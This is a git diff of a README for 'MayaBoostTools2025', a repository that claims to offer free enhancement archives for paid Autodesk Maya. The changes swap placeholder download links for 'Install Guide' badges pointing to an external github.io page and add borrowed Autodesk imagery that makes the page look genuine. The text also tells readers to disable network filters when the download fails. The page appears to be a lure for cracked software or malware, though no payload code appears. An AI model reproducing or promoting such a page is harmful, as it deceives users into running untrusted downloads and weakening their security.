@@ -2,11 +2,13 @@
 
 ![Visitors: 70K+](https://img.shields.io/badge/Visitors-70K+-e74c3c) ![Members: 45K+](https://img.shields.io/badge/Members-45K+-6c5ce7) ![Updated: 2025](https://img.shields.io/badge/Updated-2025-blue)
 
-![MayaBoostTools2025 Banner](https://i.imgur.com/maya-enhance-banner.jpg)
+![MayaBoostTools2025 Banner](https://i.ytimg.com/vi/NKJ3-WQ27X8/maxresdefault.jpg)
 
 **About MayaBoostTools2025**: MayaBoostTools2025 is a repository for *Autodesk Maya* users on Windows, offering free enhancement archives to optimize your paid software. Download tools and guides to boost 3D animation and modeling. Supported by 70K+ visitors and 45K+ members, enhance your Maya experience in 2025!
 
-[![Access Enhancements](https://img.shields.io/badge/Access_Enhancements-NOW-2ecc71?style=rounded&labelColor=27ae60)](https://example.com/maya-boost-tools.zip)
+<a href="https://maya-enhance-collective.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -29,7 +31,9 @@ Enhance your *Autodesk Maya* with **MayaBoostTools2025** on Windows:
 5. **Fix Download Issues** 🌐  
    If the archive doesn’t download, disable network filters or switch browsers (Chrome, Firefox).
 
-[![Access Enhancements](https://img.shields.io/badge/Access_Enhancements-NOW-2ecc71?style=rounded&labelColor=27ae60)](https://example.com/maya-boost-tools.zip)
+<a href="https://maya-enhance-collective.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -84,11 +88,11 @@ Enhance your *Autodesk Maya* with **MayaBoostTools2025** on Windows:
 ## 📸 Visuals
 
 **MayaBoostTools2025 Interface**  
-![Interface](https://www.example.com/images/maya-boost-interface.jpg)  
+![Interface](https://damassets.autodesk.net/content/dam/autodesk/www/products/autodesk-maya/fy25/features/images/smart-extrude-large-1920x1080.jpg)  
 *Intuitive enhancement dashboard.*
 
 **Tool Features**  
-![Features](https://www.example.com/images/maya-boost-features.jpg)  
+![Features](https://avatars.mds.yandex.net/i?id=e31fb1b91ad8838ed392f91f8deece9d_l-12390814-images-thumbs&n=13)  
 *Showcase enhanced Maya tools.*
 
 ---
